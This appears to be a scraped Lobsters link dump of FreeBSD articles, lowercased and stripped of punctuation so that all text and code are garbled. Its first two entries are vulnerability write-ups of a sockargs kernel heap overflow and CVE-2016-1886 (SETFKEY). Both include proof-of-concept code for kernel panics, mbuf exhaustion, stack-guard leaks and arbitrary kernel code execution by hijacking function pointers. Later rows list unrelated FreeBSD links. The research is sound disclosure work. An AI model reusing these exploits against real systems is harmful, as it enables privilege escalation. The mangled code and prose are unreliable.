mlen unix domain compat hack else endif buflen mclbytes return einval patch issue solved adding explicit check sockargs return einval negative length official patch may downloaded freebsd site commit reference patch may found later decided refactor function treat buflen socklent instead commit reference updated patch may found heap overflow sockargs passed bound check buflen perform zone allocation attempt copyin buffer syskernuipcsyscallsc int sockargs mp buf buflen type struct mbuf mp caddrt buf int buflen type struct sockaddr sa struct mbuf int error buflen mwaitok type mlen buflen error copyin buf mtod caddrt uint buflen error void mfree return error negative value size function always perform byte zone allocation zonembuf created mbufinit syskernuipcmbufc struct mbuf int size int short type int flag struct mbargs args struct mbuf n argsflags flag argstype type size mhlen size mlen flag mpkthdr return umazallocarg zonembuf args size casted uint negative length wrap around passed copyin summarise calling sockargs buflen zone allocation byte returned copied userland memory size byte triggering reach sockargs user controlled buflen use sendmsg system call go syssendmsg sendit sockargs desired buffer length msgcontrol msgcontrollen member struct msghdr use sendmsg system call freshly created socket without requirement alter state send function may used socket connected state sendto sendmsg may used time call syssendmsg userland struct msghdr copied msg address passed onto sendit syskernuipcsyscallsc int syssendmsg td uap struct thread td struct sendmsgargs int caddrt msg int flag uap struct msghdr msg struct iovec iov int error error copyin uap msg msg sizeof msg error return error error copyiniov msgmsgiov msgmsgiovlen iov emsgsize error return error msgmsgiov iov ifdef compatoldsock msgmsgflags endif error sendit td uap msg uap flag free iov miov return error sendit struct msghdr nonnull msgcontrol perform bound check msgcontrollen member call sockargs unsigned comparison performed msgcontrol unsigned type socklent compared sizeof operator type sizet meaning bound check wo nt catch negative value either syskernuipcsyscallsc static int sendit td mp flag struct thread td int struct msghdr mp int flag struct mbuf control struct sockaddr int error mp msgcontrol mp msgcontrollen sizeof struct cmsghdr ifdef compatoldsock mp msgflags msgcompat endif error einval goto bad error sockargs control mp msgcontrol mp msgcontrollen mtcontrol return error sockargs called negative length trigger vulnerability poc following poc code panic vulnerable version freebsd overflowing byte allocation zonembuf byte include stdioh include stringh include unistdh include systypesh include sysparamh include sysmmanh include syssocketh define buffersize define overflowsize int main void int sock struct msghdr msg char mapping buffer overflow const sizet copysize buffersize overflowsize const sizet mappingsize copysize pagesize pagesize mapping mmap null mappingsize pagesize protread protwrite mapanonymous mapprivate munmap mapping mappingsize pagesize buffer mapping mappingsize copysize overflow buffer buffersize memset overflow overflowsize sock socket afinet sockstream memset msg sizeof msg msgmsgcontrol buffer msgmsgcontrollen sendmsg sock msg munmap mapping mappingsize close sock return running binary expect panic system good idea set sysctl variable kernsynconpanic value prevent data loss controlling overflow size although size passed copyin reduce size copy using technique described analysis sysdynlibpreparedlclose kernel heap overflow cancel call copying certain amount byte essentially mapping size copy want plus one additional page unmapping additional page ensure copyin copied memory desire attempt read unmapped userland memory following trigger page fault causing return efault heap manipulation setting host unix domain socket connecting client perform allocation zonembuf time file descriptor transferred via sendmsg used manipulate heap control mbuf used vulnerability begin overflowing poc demonstrates exhausting mbuf zone left minute sysctl limit kernipcnmbufs reached system become unresponsive similar fork bomb include stdioh include stdlibh include stringh include unistdh include fcntlh include errnoh include netdbh include systypesh include sysparamh include sysmmanh include syssocketh include netinetinh include sysunh define tempfile tmpmbufpoc define infosize define infolimit define infoused define infofree define inforeq define infofail int getzoneinfo char zname int define bufsize define linesize unsigned int info file fp null char buf bufsize char iname linesize fp popen usrbinvmstat z r fp null perror popen exit memset buf sizeof buf memset iname sizeof iname fgets buf sizeof buf fp null sscanf buf u u u u u un iname info infosize info infolimit info infoused info infofree info inforeq info infofail strncmp iname zname strlen zname iname strlen zname break pclose fp return info int setuphost struct sockaddrun address int host socket afunix sockdgram host perror socket exit bind host struct sockaddr address sizeof address perror bind exit return host int setupclient struct sockaddrun address int client socket afunix sockdgram client perror socket exit connect client struct sockaddr address sizeof address perror connect exit return client int main void unlink tempfile struct sockaddrun cl memset cl sizeof cl clsunfamily afunix strncpy clsunpath tempfile int host setuphost cl int client setupclient cl struct msghdr msg char buff cmsgspace sizeof int bzero buff sizeof buff msgmsgcontrol buff msgmsgcontrollen sizeof buff struct cmsghdr cmsg cmsg cmsgfirsthdr msg cmsg cmsglen cmsglen sizeof int cmsg cmsglevel solsocket cmsg cmsgtype scmrights int transfer open ordonly odirectory transfer perror open exit memcpy int cmsgdata cmsg transfer sizeof int int u f u getzoneinfo mbuf infoused f getzoneinfo mbuf infofree printf used free dn u f ssizet nsent sendmsg client msg nsent errno enobufs printf using new socket allocationsn u unlink tempfile host setuphost cl close client client setupclient cl else perror sendmsg exit getzoneinfo mbuf infofree f printf zone mbuf expandedn return getzoneinfo function based code originally written argp note due heap fragmentation function wo nt necessarily return predictable pattern address address wo nt consistent across reboots example pattern address returned sockargs dumping overflow memory dump memory overflown guide u structure crafted overflow help identify suitible target gaining rip control put breakpoint call copyin overflow length supplied gdb break gdb cond dump region copied gdb dump binary memory dumpbin rsi dumped start buffer overflow discard first byte dump want see memory overflown target overflow direct memory overflown next struct mbuf heap follows allocation given sockargs syssysmbufh struct mbuf struct mhdr mhdr union struct struct pkthdr mhpkthdr mpkthdr set union struct mext mhext mext set char mhdatabuf mhlen mhdat mh char mdatabuf mlen mpkthdr mext mdat mbuf interface widely used throughout freebsd kernel networking stack store packet socket buffer example depending factor many allocation already performed mbuf zone size content overflow get system panic various mbuf related code path unpgc first place analysed system crashed address comparison instruction controlled address cmp byte ptr occurs unpgcprocess unp containing controlled address inlined unpgc function compiled kernel syskernuipcusrreqc static void unpgc unused void arg int pending struct unphead head unpdhead unpshead unpsphead null struct unphead head struct file f unref struct unpcb unp int total unptaskcount unplistlock first clear gc flag previous run apart unpgcignorerights head head head null head listforeach unp head unplink unp unpgcflag unp unpgcflag unpgcignorerights scan marking reachable socket unpgcref socket reachable socket reference reachable stop scan complete loop without discovering new reachable socket unpunreachable unpmarked head head head null head listforeach unp head unplink unpgcprocess unp unpmarked static void unpgcprocess struct unpcb unp struct socket soa struct socket struct file fp already processed unp unpgcflag unpgcscanned return fp unp unpfile check socket potentially cycle must queue indicated msgcount must equal file reference count note msgcount file null unp unpgcflag unpgcref fp unp unpmsgcount fp fcount unp unpmsgcount unp unpgcflag unpgcdead unpunreachable return write control bitwise unp unpgcflag unp unpgcflag unpgcdead decompiled code x pointer bit type x x effect upper byte kernel address would full kernel address could convert point address byte lower get instead however neither corrupted address mappable userland nt particularly interesting u unpdispose next panic analysed occurred address resides unpdispose function syskernuipcusrreqc static void unpdispose struct mbuf unpscan unpfreerights static void unpscan struct mbuf void op struct filedescent int struct mbuf struct cmsghdr cm void data socklent clen datalen null mnext op data datalen sizeof struct filedescent mnextpkt static void unpfreerights struct filedescent fdep int fdcount struct file fp int kassert fdcount fdcount func fdcount fdcount fp fdep fdefile filecapsfree fdep fdecaps unpdiscard fp free fdep mfilecaps syskernkerndescripc void filecapsfree struct filecaps fcaps free fcaps fcioctls mfilecaps bzero fcaps sizeof fcaps much potential could leak address kernel object containing function pointer like kqueue could cause use free would lead rip control umazfreearg decided try increasing copy size past mbuf allocation discovered eventually corrupt uma metadata turn easily exploitable code path performing overflow freeing kernel allocation relies corrupted data closing socket example system panic umazfreearg call instruction user controlled address call rax function pointer called uzdtor member umazonet typedef struct umazone sysvmumacorec void umazfreearg umazonet zone void item void udata umacachet cache umabuckett bucket int lockfail int cpu item null return zone uzdtor null zone uzdtor item zone uzsize udata hijacking function pointer method used initial announcement research since freebsd still support smap smep although planned feature hardenedbsd rip control achieved execute arbitrary userland code kernel mode code demonstrates achieving arbitrary kernel code execution bug spraying corrupted zone past mbuf allocation include stdioh include stdlibh include stringh include unistdh include systypesh include sysparamh include sysmmanh include syssocketh include sysparamh include syslinkerh void criticalenter void int kprintf const char fmt void resolve char name struct kldsymlookup ksym ksymversion sizeof ksym ksymsymname name kldsym kldsymlookup ksym perror kldsym exit printf resolved lxn ksymsymname ksymsymvalue return void ksymsymvalue void payload void criticalenter kprintf entered kernel payloadn define infosize define infolimit define infoused define infofree define inforeq define infofail int getzoneinfo char zname int define bufsize define linesize unsigned int info file fp null char buf bufsize char iname linesize fp popen usrbinvmstat z r fp null perror popen exit memset buf sizeof buf memset iname sizeof iname fgets buf sizeof buf fp null sscanf buf u u u u u un iname info infosize info infolimit info infoused info infofree info inforeq info infofail strncmp iname zname strlen zname iname strlen zname break pclose fp return info void craftzone void zone void uzslab void zone void uzdtor void zone void uzfini void zone void uzimport void zone void uzrelease void zone uzdtor payload int main void int sock struct msghdr msg criticalenter resolve criticalenter kprintf resolve printf const int previousallocations getzoneinfo mbuf infoused const sizet buffersize getzoneinfo mbuf infosize const sizet overflowsize previousallocations buffersize char mapping buffer overflow const sizet copysize buffersize overflowsize const sizet mappingsize copysize pagesize pagesize mapping mmap null mappingsize pagesize protread protwrite mapanonymous mapprivate munmap mapping mappingsize pagesize buffer mapping mappingsize copysize overflow buffer buffersize memset overflow overflowsize sizeof struct umazone since ca nt certain exactly overflow craft byte interval sizet previousallocations buffersize overflowsize craftzone overflow sock socket afinet sockstream memset msg sizeof msg msgmsgcontrol buffer msgmsgcontrollen printf performing overflown sendmsg sock msg printf triggering payloadn close sock munmap mapping mappingsize return returning payload returning payload system quickly panic jump function pointer struct umazone assumed valid checked nonnull called uzrelease stop panic occurring need make sure overflow function pointer address dummy function leave member set void craftzone void zone void uzslab void zone void uzdtor void zone void uzfini void zone void uzimport void zone void uzrelease void zone uzslab dummy uzfini payload uzimport dummy uzrelease dummy altered code path umazfreearg follows slightly target uzfini function pointer payload instead uzdtor crafting valid userland address function pointer umazfreearg return gracefully uipcdetach panicking another process close socket trigger kernel jump userland memory restoration fix corruption ideally overwrite valid zone back soon gain kernel code execution however since interest demonstrating impact bug creating fully weaponised source code decided repeat overflow different data quick demo prevent panic decided overwrite pointer arbitrary kernel function atagetxport result performing exploit allocation affected zone fail fetch command wo nt work example however technique sufficient demonstrate chosen payload final poc demonstrates using kernel code execution modify read sysctl variable reading separate userland process include stdioh include stdlibh include stringh include unistdh include systypesh include sysparamh include sysmmanh include syssocketh include sysparamh include syslinkerh void atagetxport void int kprintf const char fmt char ostype void resolve char name struct kldsymlookup ksym ksymversion sizeof ksym ksymsymname name kldsym kldsymlookup ksym perror kldsym exit printf resolved lxn ksymsymname ksymsymvalue return void ksymsymvalue void dummy void void payload void kprintf entered kernel payloadn strcpy ostype cturt define infosize define infolimit define infoused define infofree define inforeq define infofail int getzoneinfo char zname int define bufsize define linesize unsigned int info file fp null char buf bufsize char iname linesize fp popen usrbinvmstat z r fp null perror popen exit memset buf sizeof buf memset iname sizeof iname fgets buf sizeof buf fp null sscanf buf u u u u u un iname info infosize info infolimit info infoused info infofree info inforeq info infofail strncmp iname zname strlen zname iname strlen zname break pclose fp return info void craftcorruptedzone void zone void uzslab void zone void uzdtor void zone void uzfini void zone void uzimport void zone void uzrelease void zone uzslab dummy uzfini payload uzimport dummy uzrelease dummy void craftzone void zone void uzslab void zone void uzdtor void zone void uzfini void zone void uzimport void zone void uzrelease void zone put valid kernel address uzslab atagetxport uzfini atagetxport uzimport atagetxport uzrelease atagetxport int main void int sock struct msghdr msg atagetxport resolve atagetxport kprintf resolve printf ostype resolve ostype const int previousallocations getzoneinfo mbuf infoused const sizet buffersize getzoneinfo mbuf infosize const sizet overflowsize previousallocations buffersize char mapping buffer overflow const sizet copysize buffersize overflowsize const sizet mappingsize copysize pagesize pagesize mapping mmap null mappingsize pagesize protread protwrite mapanonymous mapprivate munmap mapping mappingsize pagesize buffer mapping mappingsize copysize overflow buffer buffersize memset overflow overflowsize sizeof struct umazone since ca nt certain exactly overflow craft byte interval sizet previousallocations buffersize overflowsize craftcorruptedzone overflow sock socket afinet sockstream memset msg sizeof msg msgmsgcontrol buffer msgmsgcontrollen printf performing overflown sendmsg sock msg printf triggering payloadn close sock sock socket afinet sockstream sizet previousallocations buffersize overflowsize craftzone overflow printf performing overflown sendmsg sock msg munmap mapping mappingsize return summary bug pretty standard kernel heap overflow user controlled memory user controlled size fun analysing kernel code path reachable user controlled value ultimately able successfully exploit bug gain arbitrary kernel code execution freebsd thanks
550,Lobsters,freebsd,FreeBSD,"Analysis of CVE-2016-1886, SETFKEY FreeBSD kernel vulnerability",https://cturt.github.io/SETFKEY.html,analysis setfkey freebsd kernel vulnerability,analysis freebsd kernel vulnerability introduction kbdcontrol enabling disabling led delegate rest command common handler driver introduction atkbd freebsd security team security advisory background keyboard syssyskbioh sysdevkbdkbdregh syssyskbioh sysdevkbdkbdc syssyskbioh privilege requirement sysdevkbdkbdc configuration file bug syssyslibkernh patch syssyslibkernh freebsd site byte syskernsysgenericc overflow overflow sysdevkbdkbdc target heap overflow argp exploiting uma target stack overflow argument buffer stack frame exploiting rp return userland summary vulnerability lack entropy,analysis setfkey freebsd kernel vulnerability initial publication may introduction every freebsd keyboard driver expose ioctl interface allow configured userland kbdcontrol utility example typically ioctl handler implement specific command hardware enabling disabling led delegate rest command common handler called genkbdcommonioctl discovered vulnerability common handler present since driver introduction due poor default sysctl variable bug triggered unprivileged user long least one keyboard driver running default atkbd driver used making impact critical decided report bug freebsd security team april day discovered able exploit week later assigned security advisory article provide explanation bug method considered exploitation including one success using corrupted len member keytab trigger powerful two way heap stack overflow always since interest finding analysing bug publishing fully weaponised exploit source code aim article demonstrate impact bug gaining kernel code execution unprivileged user leave development privilege escalation cleanly returning payload exercise reader detail code excerpt article taken freebsd however vulnerability present version well architecture supported freebsd background keyboard kernel struct contains pointer array table used describe function particular key array allocated heap byte reserved description syssyskbioh define maxfk sysdevkbdkbdregh typedef struct keyboard keyboardt struct keyboard struct fkeytab kbfkeytab function key string int kbfkeytabsize function key string syssyskbioh struct fkeytab uchar str maxfk uchar len genkbdcommonioctl handler expose getfkey setfkey command manage description function key userland sysdevkbdkbdc int genkbdcommonioctl keyboardt kbd ulong cmd caddrt arg keymapt mapp okeymapt omapp keyargt keyp fkeyargt fkeyp int int j int error spltty switch cmd case getfkey get functionkey string fkeyp fkeyargt arg fkeyp keynum kbd kbfkeytabsize splx return einval bcopy kbd kbfkeytab fkeyp keynum str fkeyp keydef kbd kbfkeytab fkeyp keynum len fkeyp flen kbd kbfkeytab fkeyp keynum len break case setfkey set functionkey string ifndef kbddisablekeymapload fkeyp fkeyargt arg fkeyp keynum kbd kbfkeytabsize splx return einval error fkeychangeok kbd kbfkeytab fkeyp keynum fkeyp curthread error splx return error kbd kbfkeytab fkeyp keynum len imin fkeyp flen maxfk bcopy fkeyp keydef kbd kbfkeytab fkeyp keynum str kbd kbfkeytab fkeyp keynum len break else splx return enodev endif default splx return enoioctl splx return command fkeyp struct user supplied type struct fkeyarg syssyskbioh struct fkeyarg ushort keynum char keydef maxfk char flen typedef struct fkeyarg fkeyargt privilege requirement mentioned earlier sysctl variable hwkbdkeymaprestrictchange prevents unprivileged user updating length content keymap entry checked fkeychangeok however set default value disables functionality sysdevkbdkbdc sysctlint hwkbd oidauto keymaprestrictchange ctlflagrw keymaprestrictchange restrict ability change keymap static int fkeychangeok fkeytabt oldkey fkeyargt newkey struct thread td keymaprestrictchange return oldkey len newkey flen bcmp oldkey str newkey keydef oldkey len return privcheck td privkeyboard return sure bug self freebsd poor default decided raise default value sysctl hardenedbsd perhaps freebsd follow suit functionality modify keymap entry also removed entirely compiling option kbddisablekeymapload configuration file option present generic kernel bug bug improper bound check updating length key description setfkey command obviously accepting user supplied length checked ensure copy relying wo nt write bound allocated buffer maxfk byte handler attempt using imin provide upper limit maxfk problem part code check negative value fkeyp flen kbd kbfkeytab fkeyp keynum len imin fkeyp flen maxfk passing negative length fkeyp flen signed comparison performed result imin returning negative length syssyslibkernh static inline int imin int int b return b b negative value returned imin assigned kbd kbfkeytab fkeyp keynum len unsigned type uchar mean negative length wrap around positive example wrap around triggering vulnerability requires copy size negative signed char mean may set length key description value patch submitted patch alongside report solves issue replacing imin min setfkey case genkbdcommonioctl function performs unsigned comparison instead return maxfk compared negative value syssyslibkernh static inline uint min uint uint b return b b official patch may downloaded freebsd site commit reference patch may found ioctl going resultant overflow occur invalid length set let take look ioctl system call prepares argument buffer buffer either allocated heap malloc point local stack buffer called smalldata depending whether size needed command greater sysioctlsmallsize byte syskernsysgenericc int sysioctl struct thread td struct ioctlargs uap uchar smalldata sysioctlsmallsize aligned sysioctlsmallalign ulong com int arg error uint size caddrt data interpret high order word find amount data copied tofrom user address space size iocparmlen com size com iocvoid integer argument arg intptrt uap data data void arg size else size sysioctlsmallsize data malloc ulong size mioctlops mwaitok else data smalldata else data void uap data com iocin error copyin uap data data uint size error goto else com iocout zero buffer user always get back something deterministic bzero data size error kernioctl td uap fd com data error com iocout error copyout data uap data uint size size sysioctlsmallsize free data mioctlops return error getfkey setfkey command take argument type fkeyargt byte byte stack buffer smalldata used setfkey overflow immediately setting new length setfkey bcopy performed user supplied keydef ioctl argument buffer stack key description heap array bcopy fkeyp keydef kbd kbfkeytab fkeyp keynum str kbd kbfkeytab fkeyp keynum len size argument buffer stack byte description keydef byte copy size control within range getfkey overflow corrupted size set perform inverse copy key description heap array ioctl argument buffer stack getfkey command sysdevkbdkbdc bcopy kbd kbfkeytab fkeyp keynum str fkeyp keydef kbd kbfkeytab fkeyp keynum len target heap overflow two main target heap overflow depending value specified fkeyp keynum specified copy start first struct fkeytab array read write element following depending command alternatively begin copy final element array specifying kbd kbfkeytabsize result overflowing whatever data heap follows kbd kbfkeytab allocation unfortunately since keyboard driver allocate buffer soon loaded presumably boot control adjacent memory allocation know size requested allocation byte sizeof struct fkeytab allocated byte anonymous zone check argp paper exploiting uma detailed description uma work actual size buffer allocated kbfkeytab member byte mean copying final element array size byte overflow next heap allocation byte identify whether overflowing memory would useful set breakpoint bcopy call find address kbkeytab buffer dumped set readwrite breakpoints memory following unfortunately breakpoints never triggered content dump byte nt seem used anything mean choice overflowing heap target struct fkeytab item target stack overflow argument buffer saw earlier ioctl system call designed copy much data user particular command expects time setfkey heap overflow occurs copied sizeof struct fkeyarg argument buffer without control data following ca nt directly control content overflow setfkey call however may noticed portion argument buffer expected used initialised data via copyin call used input via bzero call used output mean initial overflow content whatever uninitialised stack data rest smalldata use advantage performing various system call beforehand write stack gain control memory later occupied smalldata example perform ioctl call take larger input byte copy arbitrary content smalldata buffer trigger setfkey vulnerability since stack frame two ioctl call size go xfastsyscall sysioctl smalldata buffer occupy stack memory call long nothing else writes memory two call smalldata buffer used setfkey command still contain content first ioctl call many suitable ioctl command use siocsifphyaddr osiocaifaddr siocsdrvspec siocaifgroup etc partial success technique byte first ioctl call remained buffer time second call reached overwritten garbage data may able get better result using system call nt analyse possibility fully poc code demonstrate overflowing keytab controlled content include stdioh include stddefh include stringh include errnoh include unistdh include sysioctlh include syskbioh include sysconsioh include systypesh include syssocketh include netifh int main void int fkeyargt fkey printf fill final keytab data fkeykeynum fkeyflen memset fkeykeydef ioctl setfkey fkey printf get final keytab datan fkeykeynum fkeyflen memset fkeykeydef ioctl getfkey fkey printf keydef printf fkeykeydef printf n printf flen dn fkeyflen printf perform stack data manipulationn int sock socket afinet sockdgram struct oifaliasreq req memset req sizeof req fkeytabt keytab fkeytabt char req offsetof fkeyargt keydef memset keytab str b make sure length corrupted keytab wo nt cause stack overflow using getfkey command keytab len ioctl sock osiocaifaddr req fkeykeynum fkeyflen memset fkeykeydef ioctl setfkey fkey printf overflowed final keytab uninitialised stack datan printf get final keytab datan fkeykeynum fkeyflen memset fkeykeydef ioctl getfkey fkey printf keydef printf fkeykeydef printf n printf flen dn fkeyflen close sock return output follows fill final keytab data get final keytab data keydef flen perform stack data manipulation overflowed final keytab uninitialised stack data get final keytab data keydef flen replacing osiocaifaddr ioctl call system call treat stack differently leak many type kernel stack data userland method kernel pointer useful example however len member corrupted high reading memory trigger stack overflow getfkey stack frame corrupting key description len value anything greater offsetof fkeyargt keydef extend stack overflow past smalldata buffer rest stack frame allows u read write value stack follow smalldata buffer keydef heap array smalldata stack guard rbx rbp rip following poc demonstrates leaking stack guard include stdioh include stddefh include stringh include errnoh include unistdh include sysioctlh include syskbioh include systypesh int main void int guard fkeyargt fkey printf set keydef lengthn fkeykeynum fkeyflen memset fkeykeydef ioctl setfkey fkey printf overflow keytabsn fkeykeynum fkeyflen offsetof fkeyargt keydef sizeof guard memset fkeykeydef ioctl setfkey fkey printf get leaked stack datan fkeykeynum fkeyflen memset fkeykeydef ioctl getfkey fkey printf keydef printf fkeykeydef printf n printf flen dn fkeyflen guard char fkeykeydef printf leaked stack guard lxn guard return limitation due difference fkeyargt struct fkeytab fully control byte description byte keydef member struct padding byte partially control len member final byte control exploiting method exploitation went follows use setfkey corrupt length keytab overflow stack onto heap modify value heap data using setfkey higher keytabs use getfkey overflow heap back onto stack using previously set length since getfkey setfkey command go stack frame need change value stack want leave others like stack guard untouched preparing memory heap setfkey gain full control majority stack frame performing final getfkey call however due memory alignment work fully control lower byte return address upper byte remain could attempt use trick described earlier gain control heap initialising argument buffer first calling setfkey higher keytabs however instead decided jump piece kernel code derives function pointer one register control gain full rip control example since control could use following code umazfreearg mov rax test rax rax jz short mov esi mov rdi mov rdx rbx call rax although even better solution abuse density architecture decoding unintended offset find convenient instruction used rp find following gadget jmp rbp following poc demonstrates gaining kernel code execution bug include stdioh include stdlibh include stddefh include stringh include errnoh include unistdh include sysioctlh include syskbioh include systypesh include sysmmanh include sysparamh include syslinkerh void criticalenter void int kprintf const char fmt void resolve char name struct kldsymlookup ksym ksymversion sizeof ksym ksymsymname name kldsym kldsymlookup ksym perror kldsym exit printf resolved lxn ksymsymname ksymsymvalue return void ksymsymvalue void payload void criticalenter kprintf entered kernel payloadn copy stack onto heap void heapoverflow int index sizet size fkeyargt fkey fkeykeynum index fkeyflen size memset fkeykeydef ioctl setfkey fkey copy heap onto stack void stackoverflow int index fkeyargt fkey fkeykeynum index fkeyflen memset fkeykeydef ioctl getfkey fkey int main void int fkeyargt fkey jmp rbp rbp payload criticalenter resolve criticalenter kprintf resolve printf printf set full length key fkeykeynum fkeyflen ioctl setfkey fkey printf set bad length perform heap overflown heapoverflow offsetof fkeyargt keydef sizeof printf prepare stack overflow memoryn fkeykeynum fkeyflen ioctl getfkey fkey char fkeykeydef rbp char fkeykeydef ioctl setfkey fkey printf trigger stack overflown stackoverflow return return userland ideally restore original kernel stack frame payload return xfastsyscall correct userland register restored switching back user mode however since interest demonstrating impact bug creating fully weaponised source code decided instead use swapgs sysret return userland incorrect register asm volatile swapgs sysret trigger segmentation fault kill userland process point already executed whatever want kernel would exit anyway final poc demonstrates using kernel code execution modify read sysctl variable reading separate userland process also included code read original stack variable case anyone want try using return payload properly include stdioh include stdlibh include stddefh include stringh include errnoh include unistdh include sysioctlh include syskbioh include systypesh include sysmmanh include sysparamh include syslinkerh int kprintf const char fmt char ostype originalrip originalrbp void resolve char name struct kldsymlookup ksym ksymversion sizeof ksym ksymsymname name kldsym kldsymlookup ksym perror kldsym exit printf resolved lxn ksymsymname ksymsymvalue return void ksymsymvalue void payload void kprintf entered kernel payloadn strcpy ostype cturt asm volatile swapgs sysret copy stack onto heap void heapoverflow int index sizet size fkeyargt fkey fkeykeynum index fkeyflen size memset fkeykeydef ioctl setfkey fkey copy heap onto stack void stackoverflow int index fkeyargt fkey fkeykeynum index fkeyflen memset fkeykeydef ioctl getfkey fkey int main void int result fkeyargt fkey jmp rbp rbp payload kprintf resolve printf ostype resolve ostype printf set full length key fkeykeynum fkeyflen ioctl setfkey fkey printf set bad length perform heap overflown heapoverflow offsetof fkeyargt keydef sizeof printf prepare stack overflow memoryn fkeykeynum fkeyflen ioctl getfkey fkey originalrbp char fkeykeydef originalrip char fkeykeydef printf original rip lxn originalrip printf original rbp lxn originalrbp char fkeykeydef rbp char fkeykeydef ioctl setfkey fkey printf trigger stack overflown fflush stdout stackoverflow return summary bug special first bug reported serious enough assigned cve also really fun analyse lead powerful stack control primitive nt difficult gain arbitrary kernel code execution future hope analyse method bypassing stack protector enable exploitation stack overflow vulnerability limited like kernbinmiscadd vulnerability example past possible due freebsd implementation lack entropy
551,Lobsters,freebsd,FreeBSD,Running a FreeBSD guest within the OS X Terminal,https://asciinema.org/a/azxvrlhmmr1b5l5gczo1ze9j3,running freebsd guest within o x terminal,asciicast format download replay terminal see installation instruction use standalone player website player release page asciinema player readme,download recording asciicast format json file download replay terminal replay recording terminal asciinema play command asciinema play nt asciinema cli installed see installation instruction use standalone player website download asciinema player player release page need j cs file use like html head link rel stylesheet type textcss href asciinemaplayercss head body asciinemaplayer src col row asciinemaplayer script src asciinemaplayerjs script body html see asciinema player readme full usage instruction
552,Lobsters,freebsd,FreeBSD,LinuxFest Northwest 2016: The Devil in the Details: Switching to BSD from Linux,https://www.youtube.com/watch?v=6k1Mf0c6YW8,linuxfest northwest devil detail switching bsd linux,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature linuxfest northwest devil detail switching bsd linux youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature linuxfest northwest devil detail switching bsd linux youtube
553,Lobsters,freebsd,FreeBSD,Running FreeBSD / OpenBSD / NetBSD as a virtualised guest on Online.net,https://www.geeklan.co.uk/?p=2109,running freebsd openbsd netbsd virtualised guest onlinenet,mld snooping dhcpcd warns subnet allotted free charge hurricane electric tunnel bhyve freebsd bug netbsd netbsd network faq openbsd patch required,running mixture freebsd openbsd netbsd guest dedicated server onlinenet getting operating system installed fairly seamless getting networking going client isolated layer domain config broken client isolated much problem typically expect plugged bunch computer switch single vlan unmanaged switched example shared environment untrusted tenant cause problem broadcast multicast flood aside one open attack something like due lack mld snooping would prevent rogue router attack via much problem use nonrfc complaint timer setting make unfeasible use offered native connectivity client fail renew lease depending client used amount time take fail renew lease vary dhcpcd example warns detects lease compliant rfc section identity association nontemporary address option despite vast address range subnet allotted free charge need equal amount address address address intend use onlinenet way using allocating address possible using version proxmox provide save lot hassle configuration trying deal support regarding using hurricane electric tunnel actually found connectivity also faster hurricane electric using native connectivity connectivity guest assuming renting individual ip address prefix need use default gateway ip address assigned host alongside allotted ip address prefix assuming network detail follows default gateway host failover ip assigned mac address aa failover ip assigned mac address bb failover ip assigned mac address cc mac address need assigned tap interface host using bhyve guest using interface would performed using flag configure virtual pci ethernet card eg virtionet aa onto configuring o handle gateway another subnet connectivity freebsd freebsd need construct route reach default ip address first specify default ip address otherwise thing work assuming going use failover ip configuration etcrcconf would follows inet gatewayif gatewayip staticroutes gateway default routegateway host gatewayip interface gatewayif routedefault default gatewayip note installer present prevents network installs use iso image containing distfiles bug detail netbsd netbsd configure networking using etcnetstartlocal entering command enter console inside file assuming failover ip going used netbsd vm following would configure guest reach outside world using discussed netbsd network faq ifconfig route add net link cloning iface route add default ifa openbsd openbsd configure networking ethernet interface configuration file hostnameif assuming failover ip going used openbsd vm following setup networking inet none sbinroute add net netmask link cloning iface sbinroute add default ifa also possible specify cloning flag patch required running release
554,Lobsters,freebsd,FreeBSD,Shill: Scripting with Least Privilege - Open Projects,http://shill.seas.harvard.edu/projects.html,shill scripting least privilege open project,project shilldev seasharvardedu shill wrapper common utility improve shill documentation sexpression syntax ide support package manager trusted library networking daemon manager add additional primitive shill infer contract shill script port shill linux support job control scshlike syntax process scsh plash interactive shell,project interested contributing shill please consider one following project course idea let u know please send u email shilldev seasharvardedu interested contributing help scope potential project ranked anticipated difficulty time requirement project one star require minimal programming experience project two three star may require significant experience system programming programming racket shill wrapper common utility many common utility run privilege require excellent project familiarize shill write shill script wrap common utility like file cp l invoking capability needed improve shill documentation improvement shill documentation greatly appreciated particular need documentation security contract standard library alternatively could document learning experience tutorial getting started guide sexpression syntax create alternative sexpression syntax shill ide support add support shill ide emacs vim already support shill drracket number additional feature could added online syntax checking package manager installing package often requires running script require elevated privilege install modify file package manager built using shill would require package declare privilege require installation minimize risk running thirdparty code trusted library networking using network service like dns resolution requires powerful capability writing trusted library function service would allow script access network restricted capability daemon manager init system bsd using script manage longrunning service like apache new management service could replace script shill script make easy launch service minimal privilege add additional primitive shill shill primitive interacting file system still missing many useful primitive interacting underlying operating system project would require adding additional capability operating system service currently supported shill eg sysctl time management etc infer contract shill script shill every capablitysafe script must come contract significant burden writing shill script creating appropriate contract however possible infer reasonably precise contract structure script using technique similar type inference port shill linux shill currently relies trustedmac mandatory access control framework implement capabilitysafe sandbox porting shill linux would require adapting sandboxing kernel module use linux security framework lsm support job control currently shill allow script execute binary background job control limited setting timeout executing binary adding job control shill require designing appropriate capabilitybased api managing job modifying shill runtime scshlike syntax process scsh shell language special syntax managing process pipe io redirection adding similar syntax shill would make launching sandboxed executables easier alternatively consider syntax used plash capabilitybased interactive shell interactive shell contrast shell scripting language shill currently lacking interactive shell interactive shell shill present interesting challenge best presenting information capabilites contract user
555,Lobsters,freebsd,FreeBSD,FreeBSD Quarterly Status Report (2016-Q1),http://www.freebsd.org/news/status/report-2016-01-2016-03.html,freebsd quarterly status report,introduction clusteradm freebsdorg core freebsdorg kib freebsdorg emaste freebsdorg wjw digiwarenl open task kib freebsdorg open task trasz freebsdorg open task freebsdorg new location open task jmcneill freebsdorg manu bidouillistecom review review review review review open task wlosh netflixcom io scheduling freebsd cam subsystem article pdf bsdcan talk gonzo freebsdorg bdrewery freebsdorg mjg freebsdorg open task sepherosa gmailcom gmailcom honzhan microsoftcom decui microsoftcom http githubcomfreebsdonhypervtestbis hselasky freebsdorg ilya bakulinde open task rmacklem freebsdorg open task wblock freebsdorg jhibbits freebsdorg open task der semihalfcom wma semihalfcom zbb semihalfcom open task jhibbits freebsdorg open task emaste freebsdorg open task jhb freebsdorg open task jhb freebsdorg open task rafaelespindola gmailcom davide freebsdorg emaste freebsdorg open task port tocodomainsde freebsdgnome freebsdorg open task kde freebsdorg landed port tree website open task port tocodomainsde portmgrsecretary freebsdorg portmgr freebsdorg open task mwlucas michaelwlucascom allanjude freebsdorg tiltedwindmillpresscom open task demianfc gmailcom cpm 